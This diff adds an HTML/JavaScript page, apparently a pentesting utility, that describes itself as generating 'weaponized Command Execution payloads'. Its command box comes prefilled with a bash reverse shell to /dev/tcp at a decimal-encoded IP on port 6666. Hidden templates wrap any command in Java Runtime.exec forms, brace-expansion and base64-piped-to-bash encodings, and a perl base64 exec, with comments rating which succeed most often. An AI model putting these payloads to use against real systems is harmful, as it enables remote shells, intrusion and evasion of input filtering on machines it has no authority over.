@@ -1,0 +1,215 @@
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>exec</title>
+    <link rel="stylesheet" type="text/css" href="../css/bootstrap.min.css">
+</head>
+
+<body>
+
+    <!-- payloads template -->
+
+    <textarea id="data0"
+        hidden="true">arr0w1_cmd</textarea>
+
+    <textarea id="data1" hidden="true">
+1⃣️ 参数类型 String[]
+java.lang.Runtime.getRuntime().exec​(String[] cmdarray)    
+Executes the specified command and arguments in a separate process.
+
+例
+java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","echo '123' > ~/Downloads/111.txt"});
+
+🔥实际payload - for Linux/macOS 【成功率很高】
+java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd"});
+</textarea>
+
+    <textarea id="data2" hidden="true">
+传入参数为 字符串
+如 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
+
+
+🔥实际payload 注意: 如果传入的字符串 里有 < > | 符号时, 可能不会执行成功!
+/bin/bash -c $@|bash 0 arr0w1_cmd
+
+🔥实际payload for Linux【成功率很高】 支持Linux 不支持macOS
+/bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash</textarea>
+
+    <textarea id="data3" hidden="true">
+
+1⃣️ 使用base64命令
+支持Linux 不支持macOS
+{echo,arr0w1_base64}|{base64,-d}|bash
+
+
+2⃣️ 使用perl中的base64语句
+支持Linux/macOS
+perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'</textarea>
+
+    <textarea id="data4" hidden="true">
+</textarea>
+
+    <textarea id="data5" hidden="true">
+</textarea>
+
+    <textarea id="data6" hidden="true">
+</textarea>
+
+<!-- ----------------- -->
+
+    <main role="main">
+        <section class="jumbotron text-center g-light">
+            <div class="container">
+                <h1>exec</h1>
+                <p class="lead text-muted">Generate weaponized Command Execution payloads.</p>
+            </div>
+            <br>
+
+            <p class="font-weight-bold">The command you want to execute:</p>
+            <input type="text" id="your_cmd" value="/bin/bash -i >& /dev/tcp/181614338/6666 0>&1" oninput="func_oninput()"
+                class="form-control text-white bg-dark" autofocus
+                onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
+
+            <br>
+
+            <hr> <!-- ---------- -->
+            
+            <p class="font-weight-bold" style="display: none;">原始命令</p>
+            
+            <textarea id="payload0" class="form-control" style="display: none; rows="1"></textarea>
+
+            <br>
+            <br>
+            1 Java
+            <p class="font-weight-bold">java.lang.Runtime.getRuntime().exec​(以下内容);</p>
+            <textarea id="payload1" class="form-control" rows="3"></textarea>
+
+            <br>
+            <br>
+            2 Java
+            <p class="font-weight-bold">java.lang.Runtime.getRuntime().exec("以下内容"); </p>
+            <textarea id="payload2" class="form-control" rows="3"></textarea>
+
+            <br>
+            <br>
+            3 shell
+            <p class="font-weight-bold">Encoding - base64 </p>
+            <textarea id="payload3" class="form-control" rows="3"></textarea>
+
+            <br>
+            <br>
+            4
+            <p class="font-weight-bold">temp </p>
+            <textarea id="payload4" class="form-control" rows="3"></textarea>
+
+            <br>
+            <br>
+            5
+            <p class="font-weight-bold">temp </p>
+            <textarea id="payload5" class="form-control" rows="3"></textarea>
+
+            <br>
+            <br>
+            6
+            <p class="font-weight-bold">temp </p>
+            <textarea id="payload6" class="form-control" rows="3"></textarea>
+
+        </section>
+    </main>
+
+    <footer class="text-muted">
+        <div class="container">
+            <p class="float-right">
+                <a href="#">Back to TOP</a>
+            </p>
+            <p>arr0w1</p>
+        </div>
+    </footer>
+
+</body>
+
+
+<script>
+
+    // -----
+
+    // get elements - hiddened
+    element_data0 = document.getElementById("data0");
+    element_data1 = document.getElementById("data1");
+    element_data2 = document.getElementById("data2");
+    element_data3 = document.getElementById("data3");
+    element_data4 = document.getElementById("data4");
+    element_data5 = document.getElementById("data5");
+    element_data6 = document.getElementById("data6");
+
+    // get datas
+    var data0 = element_data0.value;
+    var data1 = element_data1.value;
+    var data2 = element_data2.value;
+    var data3 = element_data3.value;
+    var data4 = element_data4.value;
+    var data5 = element_data5.value;
+    var data6 = element_data6.value;
+
+    // -----
+
+    //textarea增高 随内容自动增加textarea的高度
+    function auto_grow(element) {
+        element.style.height = "5px";
+        element.style.height = (element.scrollHeight) + "px";
+    }
+
+    // -----
+
+    // 生成不带=的base64字符串
+    function func_wise_btoa(str1) {
+        //原理:在原始js语句后加空格 直到生成的base64字符串没有空格
+        while (1) {
+            if (btoa(str1).indexOf("=") == -1) {//  等号不存在
+                return btoa(str1);
+            } else {
+                str1 = str1 + " ";
+            }
+
+        }
+    }
+
+    var func_oninput = function () {
+
+        var your_cmd = document.getElementById("your_cmd").value;
+
+        var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd", your_cmd);
+
+        var cmd_origin_btoa_ed = func_wise_btoa(cmd_origin);
+
+        document.getElementById("payload0").value = cmd_origin;
+
+        document.getElementById("payload1").value = data1.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd/g, your_cmd);
+
+        // 全部匹配 /g
+        document.getElementById("payload2").value = data2.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd/g, your_cmd);
+
+        document.getElementById("payload3").value = data3.replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd/g, your_cmd);
+
+        document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+
+        document.getElementById("payload5").value = data5.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+
+        document.getElementById("payload6").value = data6.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+
+        auto_grow(document.getElementById("payload0"));
+        auto_grow(document.getElementById("payload1"));
+        auto_grow(document.getElementById("payload2"));
+        auto_grow(document.getElementById("payload3"));
+        auto_grow(document.getElementById("payload4"));
+        auto_grow(document.getElementById("payload5"));
+        auto_grow(document.getElementById("payload6"));
+    }
+
+    // -----
+
+    func_oninput();
+</script>
+
+</html>
